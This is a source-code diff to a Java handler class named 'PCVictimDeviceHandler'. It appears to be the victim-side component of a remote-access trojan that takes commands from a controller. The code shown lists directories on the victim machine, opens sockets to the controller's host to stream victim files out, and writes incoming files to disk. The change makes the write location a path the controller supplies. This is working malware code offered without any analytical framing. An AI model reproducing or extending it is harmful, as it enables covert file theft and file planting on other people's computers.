@@ -48,7 +48,7 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
             case "get.files":
                 File dirFile = new File((String) message.get("path"));
                 if (!dirFile.isDirectory()) {
-                    sendErrorCode("fileIsntDir", (String) message.get("owner"));
+                    sendErrorCode("fileIsntDirectory", (String) message.get("owner"));
                     return;
                 }
                 JSONArray files = new JSONArray();
@@ -113,9 +113,9 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
                 break;
             case "start.download.file":
                 try {
-                    String testPath = "victimDownloads/";
+                    String downloadPath = (String) message.get("downloadPath");
                     String filename = (String) message.get("filename");
-                    File file = new File(testPath + filename);
+                    File file = new File(downloadPath + filename);
                     FileOutputStream fileOutputStream = new FileOutputStream(file);
                     Socket socket = new Socket(host, Math.toIntExact((Long) message.get("port")));
                     InputStream inputStream = socket.getInputStream();
@@ -138,7 +138,7 @@ public class PCVictimDeviceHandler extends ChannelInboundHandlerAdapter {
                     OutputStream outputStream = socket.getOutputStream();
                     File file = new File((String) message.get("path"));
                     if (file.isDirectory()) {
-                        sendErrorCode("fileIsDir", (String) message.get("owner"));
+                        sendErrorCode("fileIsDirectory", (String) message.get("owner"));
                         return;
                     }
                     FileInputStream fileInputStream = new FileInputStream(file);
